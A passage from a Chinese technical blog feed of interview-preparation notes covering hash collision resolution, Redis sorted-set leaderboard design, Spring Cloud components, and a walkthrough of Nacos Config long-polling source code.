lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解决哈希冲突的方法"><a href="#解决哈希冲突的方法" class="headerlink" title="解决哈希冲突的方法"></a>解决哈希冲突的方法</h2><h3 id="开放定址法"><a href="#开放定址法" class="headerlink" title="开放定址法"></a>开放定址法</h3><p>从发生冲突的那个单元起，按照一定的次序，从哈希表中找到一个空闲的单元。然后把发生冲突的元素存入到该单元的一种方法。开放定址法需要的表长度要大于等于所需要存放的元素。</p><p>在开放定址法中解决冲突的方法有：线行探查法、平方探查法、双散列函数探查法。</p><p>开放定址法的缺点在于删除元素的时候不能真的删除，否则会引起查找错误，只能做一个特殊标记。只到有下个元素插入才能真正删除该元素。</p><h4 id="线行探查法"><a href="#线行探查法" class="headerlink" title="线行探查法"></a>线行探查法</h4><p>线行探查法是开放定址法中最简单的冲突处理方法，它从发生冲突的单元起，依次判断下一个单元是否为空，当达到最后一个单元时，再从表首依次判断。直到碰到空闲的单元或者探查完全部单元为止。</p><p>可以参考csdn上flash对该方法的演示：<br><a href="http://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf">http://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf</a></p><h4 id="平方探查法"><a href="#平方探查法" class="headerlink" title="平方探查法"></a>平方探查法</h4><p>平方探查法即是发生冲突时，用发生冲突的单元d[i], 加上 1²、 2²等。即d[i] + 1²，d[i] + 2², d[i] + 3²…直到找到空闲单元。</p><p>在实际操作中，平方探查法不能探查到全部剩余的单元。不过在实际应用中，能探查到一半单元也就可以了。若探查到一半单元仍找不到一个空闲单元，表明此散列表太满，应该重新建立。</p><h4 id="双散列函数探查法"><a href="#双散列函数探查法" class="headerlink" title="双散列函数探查法"></a>双散列函数探查法</h4><p>这种方法使用两个散列函数hl和h2。其中hl和前面的h一样，以关键字为自变量，产生一个0至m—l之间的数作为散列地址；h2也以关键字为自变量，产生一个l至m—1之间的、并和m互素的数(即m不能被该数整除)作为探查序列的地址增量(即步长)，探查序列的步长值是固定值l；对于平方探查法，探查序列的步长值是探查次数i的两倍减l；对于双散列函数探查法，其探查序列的步长值是同一关键字的另一散列函数的值。</p><h3 id="链地址法（拉链法）"><a href="#链地址法（拉链法）" class="headerlink" title="链地址法（拉链法）"></a>链地址法（拉链法）</h3><p>链接地址法的思路是将哈希值相同的元素构成一个同义词的单链表，并将单链表的头指针存放在哈希表的第i个单元中，查找、插入和删除主要在同义词链表中进行。链表法适用于经常进行插入和删除的情况。</p><p>如下一组数字,(32、40、36、53、16、46、71、27、42、24、49、64)哈希表长度为13，哈希函数为H(key)&#x3D;key%13,则链表法结果如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>       </span><br><span class="line"><span class="number">1</span>  -&gt; <span class="number">40</span> -&gt; <span class="number">27</span> -&gt; <span class="number">53</span> </span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span>  -&gt; <span class="number">16</span> -&gt; <span class="number">42</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span>  -&gt; <span class="number">32</span> -&gt; <span class="number">71</span></span><br><span class="line"><span class="number">7</span>  -&gt; <span class="number">46</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span> -&gt; <span class="number">36</span> -&gt; <span class="number">49</span></span><br><span class="line"><span class="number">11</span> -&gt; <span class="number">24</span></span><br><span class="line"><span class="number">12</span> -&gt; <span class="number">64</span></span><br></pre></td></tr></table></figure><p>注：在java中，链接地址法也是HashMap解决哈希冲突的方法之一，jdk1.7完全采用单链表来存储同义词，jdk1.8则采用了一种混合模式，对于链表长度大于8的，会转换为红黑树存储。</p><h3 id="再哈希法"><a href="#再哈希法" class="headerlink" title="再哈希法"></a>再哈希法</h3><p>就是同时构造多个不同的哈希函数：</p><p>Hi &#x3D; RHi(key)   i&#x3D; 1,2,3 … k;</p><p>当H1 &#x3D; RH1(key)  发生冲突时，再用H2 &#x3D; RH2(key) 进行计算，直到冲突不再产生，这种方法不易产生聚集，但是增加了计算时间。</p><h3 id="建立公共溢出区"><a href="#建立公共溢出区" class="headerlink" title="建立公共溢出区"></a>建立公共溢出区</h3><p>将哈希表分为公共表和溢出表，当溢出发生时，将所有溢出数据统一放到溢出区。</p><h2 id="排行榜设计"><a href="#排行榜设计" class="headerlink" title="排行榜设计"></a>排行榜设计</h2><h3 id="基于数据库"><a href="#基于数据库" class="headerlink" title="基于数据库"></a>基于数据库</h3><p>基于MySQL，order by</p><p>缺点：</p><ul><li>速度慢</li></ul><h3 id="基于Redis"><a href="#基于Redis" class="headerlink" title="基于Redis"></a>基于Redis</h3><p>主要考察sort set 也就是zset</p><p>zadd添加数据后，zrevrange获取排序后的排名</p><h3 id="类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样"><a href="#类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样" class="headerlink" title="类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样"></a>类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样</h3><p>key的设计比较重要，比如aa用户和bb用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zadd step:aa 1000 小明</span><br><span class="line">zadd step:bb 1000 小明</span><br></pre></td></tr></table></figure><p>同理时间也可以通过key的设计解决</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zadd step:aa:20210929 1000 小明</span><br><span class="line">zadd step:aa:20210929 1000 小明</span><br></pre></td></tr></table></figure><p>但是上述设计会导致每个用户都有一个排行榜，存储的数据巨大，其实可以考虑只在用户查询时通过好友关系去生成</p><p>那朋友圈排行榜的：微信头像、点赞数 怎么获取呢</p><ul><li>可以使用hmset hash储存对象，需要时通过zset储存的key去查询即可</li></ul><h3 id="最近七天排行榜怎么弄"><a href="#最近七天排行榜怎么弄" class="headerlink" title="最近七天排行榜怎么弄"></a>最近七天排行榜怎么弄</h3><p>前面我们说的都是每日排行榜。</p><p>假设面试官要求我们提供一个最近七天、上一周、上一月、上个季度、这一年排行榜啥的，又该怎么搞呢？</p><p>其实这还是在考察你对于 Redis 有序集合 API 的掌握程度。</p><p>也就是这个 API：</p><ul><li>zinterstore&#x2F;zunionstore destination numkeys key [key …] [weights weight [weight …]] [aggregate sum|min|max] 获取交集&#x2F;并集<ul><li>zinterstore&#x2F;zunionstore其实就是交集&#x2F;并集</li><li>destination 将交集&#x2F;并集的结果保存到这个键中</li><li>numkeys 需要做交集&#x2F;并集的集合的个数</li><li>key [key …] 具体参与交集&#x2F;并集的集合</li><li>weights weight [weight …] 每个参与计算的集合的权重。在做交集&#x2F;并集计算时，每个集合中的 member 会把自己的 score 乘以这个权重，默认为 1。</li><li>aggregate sum|min|max 对于各个集合中的相同元素是 sum(求和)、min(取最小值)还是max(取最大值)，默认为 sum。</li></ul></li></ul><p>比如现在有一些数据</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zadd sport:ranking:why:20210222 43243 why 2341 mx 8764 les 42321 skr</span><br><span class="line">zadd sport:ranking:why:20210223 57632 why 24354 mx 4231 les 43512 skr 5341 jay</span><br><span class="line">zadd sport:ranking:why:20210224 10026 why 12344 mx 54312 les 34531 skr 43512 jay</span><br><span class="line">zadd sport:ranking:why:20210225 54312 why 32451 mx 23412 les 21341 skr 56321 jay</span><br><span class="line">zadd sport:ranking:why:20210226 3212 why 63421 mx 53652 les 45621 skr 5723 jay</span><br><span class="line">zadd sport:ranking:why:20210227 5462 why 10158 mx 30169 les 48858 skr 66079 jay</span><br><span class="line">zadd sport:ranking:why:20210228 43553 why 4451 mx 7431 les 9563 skr 8232 jay</span><br></pre></td></tr></table></figure><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/10.png"></p><p>现在我们要求出最近 7 天的排行榜，就用下面这行命令，命令有点复杂，但是对着命令格式看，还是很清晰的：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zunionstore sport:ranking:why:last_seven_day 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum</span><br></pre></td></tr></table></figure><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/11.png"></p><p>上面用的是并集，如果我们的要求是对最近 7 天，每天都上传运动数据的人进行排序，就用交集来算。</p><p>命令和上面的一致，只是把 zunionstore 修改为 zinterstore 即可。</p><p>另外为了有对比，合并之后的队列名称也修改一下，命令如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zinterstore sport:ranking:why:last_seven_day_zinterstore 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum</span><br></pre></td></tr></table></figure><p><img src="/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/12.png"></p><p>知道最近 7 天的做法了，我们又有每一天数据，上一周、上一月、上个季度、这一年排行榜啥的不都是这个套路吗</p><h3 id="亿级用户排行榜"><a href="#亿级用户排行榜" class="headerlink" title="亿级用户排行榜"></a>亿级用户排行榜</h3><h4 id="按段位分桶"><a href="#按段位分桶" class="headerlink" title="按段位分桶"></a>按段位分桶</h4><p>由于数据量比较大，所以需要类似于分成一个个小文件的思想去统计每一部分的数据</p><p>比如游戏里的段位，统计国服前100，可以把王者、大师、砖石、铂金、黄金、白银、青铜 分为不同的桶，每个分段的人在不同的桶里(假设还是用zset存储用户的段位)<br>那计算全服排名即可先计算在某个段位桶的排名x,再获取这个段位桶前的所有桶的大小y1,y2…yn，排名就计算出来了x+y1+y2….yn</p><h5 id="计算top100"><a href="#计算top100" class="headerlink" title="计算top100"></a>计算top100</h5><p>分桶后，直接在段位最大的桶里计算top100即可</p><h4 id="按积分分桶"><a href="#按积分分桶" class="headerlink" title="按积分分桶"></a>按积分分桶</h4><p>[0-5000] [5001-10000] …..[10000000-x]</p><p>这种可能会出现热点问题，比如处于0-5000区间的人会非常多（可能很多人都是没有打排位）用户的落点其实并不是均匀的，那就需要通过其他预测算法去预估每个区间的人数了</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 场景设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Springcloud最热点面试题</title>
      
      <link href="/2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、智能路由、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。</p><p>Spring Cloud并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p><h2 id="服务注册与发现"><a href="#服务注册与发现" class="headerlink" title="服务注册与发现"></a>服务注册与发现</h2><h3 id="eureka"><a href="#eureka" class="headerlink" title="eureka"></a>eureka</h3><p>服务治理组件，包括服务端的注册中心和客户端的服务发现机制；</p><h3 id="consul"><a href="#consul" class="headerlink" title="consul"></a>consul</h3><p>基于Hashicorp Consul的服务治理组件。</p><h2 id="服务负载与均衡"><a href="#服务负载与均衡" class="headerlink" title="服务负载与均衡"></a>服务负载与均衡</h2><h3 id="ribbon"><a href="#ribbon" class="headerlink" title="ribbon"></a>ribbon</h3><p>负载均衡的服务调用组件，具有多种负载均衡调用策略；</p><h3 id="loadbalancer"><a href="#loadbalancer" class="headerlink" title="loadbalancer"></a>loadbalancer</h3><h2 id="服务负载与调用"><a href="#服务负载与调用" class="headerlink" title="服务负载与调用"></a>服务负载与调用</h2><h3 id="feign"><a href="#feign" class="headerlink" title="feign"></a>feign</h3><p>基于Ribbon和Hystrix的声明式服务调用组件；</p><h3 id="openFeign"><a href="#openFeign" class="headerlink" title="openFeign"></a>openFeign</h3><p>基于Ribbon和Hystrix的声明式服务调用组件，可以动态创建基于Spring MVC注解的接口实现用于服务调用，在Spring Cloud 2.0中已经取代Feign成为了一等公民。</p><h2 id="服务熔断与降级"><a href="#服务熔断与降级" class="headerlink" title="服务熔断与降级"></a>服务熔断与降级</h2><h3 id="hystrix"><a href="#hystrix" class="headerlink" title="hystrix"></a>hystrix</h3><p>服务容错组件，实现了断路器模式，为依赖服务的出错和延迟提供了容错能力；</p><h3 id="resilience4j"><a href="#resilience4j" class="headerlink" title="resilience4j"></a>resilience4j</h3><h2 id="服务网关"><a href="#服务网关" class="headerlink" title="服务网关"></a>服务网关</h2><h3 id="zuul"><a href="#zuul" class="headerlink" title="zuul"></a>zuul</h3><p>API网关组件，对请求提供路由及过滤功能。</p><h3 id="zuul2"><a href="#zuul2" class="headerlink" title="zuul2"></a>zuul2</h3><h3 id="getway"><a href="#getway" class="headerlink" title="getway"></a>getway</h3><p>API网关组件，对请求提供路由及过滤功能。</p><h2 id="服务分布式配置"><a href="#服务分布式配置" class="headerlink" title="服务分布式配置"></a>服务分布式配置</h2><h3 id="springcloud-config"><a href="#springcloud-config" class="headerlink" title="springcloud config"></a>springcloud config</h3><p>集中配置管理工具，分布式系统中统一的外部配置管理，默认使用Git来存储配置，可以支持客户端配置的刷新及加密、解密操作。</p><h3 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h3><h2 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h2><h3 id="Spring-Cloud-Bus"><a href="#Spring-Cloud-Bus" class="headerlink" title="Spring Cloud Bus"></a>Spring Cloud Bus</h3><p>用于传播集群状态变化的消息总线，使用轻量级消息代理链接分布式系统中的节点，可以用来动态刷新集群中的服务配置。</p><h1 id="springcloudAlibaba"><a href="#springcloudAlibaba" class="headerlink" title="springcloudAlibaba"></a>springcloudAlibaba</h1><h2 id="Nacos-1"><a href="#Nacos-1" class="headerlink" title="Nacos"></a>Nacos</h2><p>Nacos 是一个开源的分布式系统服务发现、配置管理和服务管理平台。它主要包含以下功能：</p><p>服务发现与注册：Nacos 可以管理服务的注册和发现，支持 DNS 和 HTTP&#x2F;RESTful 方式。<br>配置管理：Nacos 可以动态管理配置，支持多种数据类型和版本控制。<br>服务管理：Nacos 可以对服务进行健康检查、流量管理、负载均衡等。</p><h3 id="服务发现与注册"><a href="#服务发现与注册" class="headerlink" title="服务发现与注册"></a>服务发现与注册</h3><p>Nacos 实现服务发现和注册的核心代码位于 nacos&#x2F;naming 目录下，包括以下文件：</p><ul><li>naming-common&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;api&#x2F;naming: 定义了服务发现和注册的 API 接口和数据模型。</li><li>naming-core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;naming: 实现了服务发现和注册的核心逻辑。</li><li>naming-impl&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;naming: 实现了服务发现和注册的具体实现。</li></ul><p>下面简单介绍一下 Nacos 的服务发现和注册的实现流程。</p><h4 id="服务注册流程"><a href="#服务注册流程" class="headerlink" title="服务注册流程"></a>服务注册流程</h4><p>服务提供者向 Nacos 注册服务时，会调用 NamingService.registerInstance() 方法，该方法会做以下几件事情：</p><ol><li>将服务实例的元数据封装为 Instance 对象，包括服务名、IP、端口号、健康状态、元数据等。</li><li>将 Instance 对象转换为 InstanceEntity 对象，包含了实例 ID 和实例元数据的 JSON 字符串。</li><li>将 InstanceEntity 对象存储到 Nacos 中，可以存储到内存中或者持久化到磁盘中。</li></ol><h4 id="服务发现流程"><a href="#服务发现流程" class="headerlink" title="服务发现流程"></a>服务发现流程</h4><p>服务消费者向 Nacos 发现服务时，会调用 NamingService.getAllInstances() 或 NamingService.selectInstances() 方法，该方法会做以下几件事情：</p><ol><li>从 Nacos 中获取服务实例的元数据，包括服务名、IP、端口号、健康状态、元数据等。</li><li>将元数据封装为 Instance 对象，存储到本地缓存中。</li><li>根据负载均衡算法选择一个服务实例处理请求，可以选择轮询、随机、权重等算法。</li></ol><p>服务发现和注册的核心逻辑在 naming-core 目录下的 com.alibaba.nacos.naming 包中实现，主要包括以下类：</p><ul><li>com.alibaba.nacos.naming.core.InstancesManager: 维护服务实例的元数据和状态信息。</li><li>com.alibaba.nacos.naming.core.Cluster: 维护一个服务的所有实例信息和负载均衡策略。</li><li>com.alibaba.nacos.naming.core.InstanceOperator: 实现了服务实例的注册、注销和更新操作。</li><li>com.alibaba.nacos.naming.core.DomainsManager: 维护多个服务的信息，包括服务名、集群名、命名空间等。</li></ul><p>服务发现和注册的具体实现在 naming-impl 目录下的 com.alibaba.nacos.naming 包中，主要包括以下类：</p><ul><li>com.alibaba.nacos.naming.push.PushService: 实现了服务实例的推送功能。</li><li>com.alibaba.nacos.naming.healthcheck.HealthCheckProcessor: 实现了服务实例的健康检查功能。</li><li>com.alibaba.nacos.naming.misc.GlobalConfig: 存储了一些全局配置，例如默认权重值、心跳间隔</li></ul><h3 id="配置动态刷新"><a href="#配置动态刷新" class="headerlink" title="配置动态刷新"></a>配置动态刷新</h3><p>从远端服务器获取变更数据的主要模式有两种：推（push）和拉（pull）。Push 模式简单来说就是服务端主动将数据变更信息推送给客户端，这种模式优点是时效性好，服务端数据发生变更可以立马通知到客户端，但这种模式需要服务端维持与客户端的心跳连接，会增加服务端实现的复杂度，服务端也需要占用更多的资源来维持与客户端的连接。</p><p>而 Pull 模式则是客户端主动去服务器请求数据，例如，每间隔10ms就向服务端发起请求获取数据。显而易见pull模式存在时效性问题。请求的间隔也不太好设置，间隔太短，对服务器请求压力过大。间隔时间过长，那么必然会造成时效性很差。而且如果配置长时间不更新，并且存在大量的客户端就会产生大量无效的pull请求。</p><p>Nacos 没有采用上述的两种模式，而是采用了长轮询方式结合了推和拉的优点：</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png" alt="动态刷新图"></p><p>长轮询也是轮询，因此 Nacos 客户端会默认每10ms向服务端发起请求，当客户端请求服务端时会在请求头上携带长轮询的超时时间，默认是30s。而服务端接收到该请求时会hang住请求，为了防止客户端超时会在请求头携带的超时时间上减去500ms，因此默认会hang住请求29.5s。在这期间如果服务端发生了配置变更会产生相应的事件，监听到该事件后，会响应对应的客户端。这样一来客户端不会频繁发起轮询请求，而服务端也不需要维持与客户端的心跳，兼备了时效性和复杂度。</p><p><img src="/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/2.png" alt="长轮询图"></p><blockquote><p>1.4版本nacos使用Http短连接+长轮询的方式，客户端发起http请求，服务端hold住请求，当配置变更时响应客户端，超时时间30s。<br>2.0版本nacos用gRPC长连接代替了http短连接长轮询。配置同步采用推拉结合的方式。</p></blockquote><h4 id="Nacos-Config-长轮询源码剖析"><a href="#Nacos-Config-长轮询源码剖析" class="headerlink" title="Nacos Config 长轮询源码剖析"></a>Nacos Config 长轮询源码剖析</h4><p>首先，打开 com.alibaba.cloud.nacos.NacosConfigBootstrapConfiguration 这个类，从类名也可以看出该类是Nacos Config的启动配置类，是Nacos Config自动装配的入口。在该类中的 nacosConfigManager 方法实例化了一个 NacosConfigManager 对象，并注册到容器中：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line"><span class="keyword">public</span> NacosConfigManager <span class="title function_">nacosConfigManager</span><span class="params">(</span></span><br><span class="line"><span class="params">NacosConfigProperties nacosConfigProperties)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">NacosConfigManager</span>(nacosConfigProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 NacosConfigManager 的构造器中调用了 createConfigService 方法，这是一个静态方法用来创建 ConfigService 对象的单例。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Compatible with old design,It will be perfected in the future.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> ConfigService <span class="title function_">createConfigService</span><span class="params">(</span></span><br><span class="line"><span class="params">NacosConfigProperties nacosConfigProperties)</span> &#123;</span><br><span class="line">    <span class="comment">// 双重检查锁模式的单例</span></span><br><span class="line"><span class="keyword">if</span> (Objects.isNull(service)) &#123;</span><br><span class="line"><span class="keyword">synchronized</span> (NacosConfigManager.class) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Objects.isNull(service)) &#123;</span><br><span class="line">service = NacosFactory.createConfigService(</span><br><span class="line">nacosConfigProperties.assembleConfigServiceProperties());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (NacosException e) &#123;</span><br><span class="line">log.error(e.getMessage());</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NacosConnectionFailureException</span>(</span><br><span class="line">nacosConfigProperties.getServerAddr(), e.getMessage(), e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> service;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConfigService 的具体实现是 NacosConfigService，在该类的构造器中主要初始化了 HttpAgent 和 ClientWorker 对象。ClientWorker 的构造器中则初始化了几个线程池：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClientWorker</span><span class="params">(<span class="keyword">final</span> HttpAgent agent, <span class="keyword">final</span> ConfigFilterChainManager configFilterChainManager,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Properties properties)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.agent = agent;</span><br><span class="line">    <span class="built_in">this</span>.configFilterChainManager = configFilterChainManager;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Initialize the timeout parameter</span></span><br><span class="line">    init(properties);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建具有定时执行功能的单线程池，用于定时执行 checkConfigInfo 方法</span></span><br><span class="line">    <span class="built_in">this</span>.executor = Executors.newScheduledThreadPool(<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">ThreadFactory</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Thread <span class="title function_">newThread</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(r);</span><br><span class="line">            t.setName(<span class="string">&quot;com.alibaba.nacos.client.Worker.&quot;</span> + agent.getName());</span><br><span class="line">            t.setDaemon(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建具有定时执行功能的且线程数与cpu核数相对应的线程池，用于根据需要动态刷新的配置文件执行 LongPollingRunnable，因此长轮询任务是可以有多个并行的</span></span><br><span class="line">    <span class="built_in">this</span>.executorService = Executors</span><br><span class="line">            .newScheduledThreadPool(Runtime.getRuntime().availableProcessors(), <span class="keyword">new</span> <span class="title class_">ThreadFactory</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> Thread <span class="title function_">newThread</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">                    <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(r);</span><br><span class="line">                    t.setName(<span class="string">&quot;com.alibaba.nacos.client.Worker.longPolling.&quot;</span> + agent.getName());</span><br><span class="line">                    t.setDaemon(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> t;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            </span><br><span class="line">    <span class="comment">// 每10ms执行一次 checkConfigInfo 方法</span></span><br><span class="line">    <span class="built_in">this</span>.executor.scheduleWithFixedDelay(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                checkConfigInfo();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;[&quot;</span> + agent.getName() + <span class="string">&quot;] [sub-check] rotate check error&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1L</span>, <span class="number">10L</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">    <span class="comment">// 长轮询的超时时间，默认为30秒，此参数会被放到请求头中带到服务端，服务端会根据该参数去做长轮询的hold</span></span><br><span class="line">    timeout = Math.max(ConvertUtils.toInt(properties.getProperty(PropertyKeyConst.CONFIG_LONG_POLL_TIMEOUT),</span><br><span class="line">            Constants.CONFIG_LONG_POLL_TIMEOUT), Constants.MIN_CONFIG_LONG_POLL_TIMEOUT);</span><br><span class="line">    </span><br><span class="line">    taskPenaltyTime = ConvertUtils</span><br><span class="line">            .toInt(properties.getProperty(PropertyKeyConst.CONFIG_RETRY_TIME), Constants.CONFIG_RETRY_TIME);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">this</span>.enableRemoteSyncConfig = Boolean</span><br><span class="line">            .parseBoolean(properties.getProperty(PropertyKeyConst.ENABLE_REMOTE_SYNC_CONFIG));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Check config info.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkConfigInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Dispatch taskes.</span></span><br><span class="line">    <span class="comment">// 获取需要监听的文件数量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">listenerSize</span> <span class="operator">=</span> cacheMap.size();</span><br><span class="line">    <span class="comment">// Round up the longingTaskCount.</span></span><br><span class="line">    <span class="comment">// 默认一个 LongPollingRunnable 可以处理监听3k个配置文件的变化，超过3k个才会创建新的 LongPollingRunnable</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">longingTaskCount</span> <span class="operator">=</span> (<span class="type">int</span>) Math.ceil(listenerSize / ParamUtil.getPerTaskConfigSize());</span><br><span class="line">    <span class="keyword">if</span> (longingTaskCount &gt; currentLongingTaskCount) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (<span class="type">int</span>) currentLongingTaskCount; i &lt; longingTaskCount; i++) &#123;</span><br><span class="line">            <span class="comment">// The task list is no order.So it maybe has issues when changing.</span></span><br><span class="line">            executorService.execute(<span class="keyword">new</span> <span class="title class_">LongPollingRunnable</span>(i));</span><br><span class="line">        &#125;</span><br><span class="line">        currentLongingTaskCount = longingTaskCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LongPollingRunnable 类主要用于检查本地配置，以及长轮询地去服务端获取变更配置的 dataid 和 group，其代码位于 com.alibaba.nacos.client.config.impl.ClientWorker 类，代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LongPollingRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> taskId;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LongPollingRunnable</span><span class="params">(<span class="type">int</span> taskId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.taskId = taskId;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">        List&lt;CacheData&gt; cacheDatas = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;CacheData&gt;();</span><br><span class="line">        List&lt;String&gt; inInitializingCacheList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span 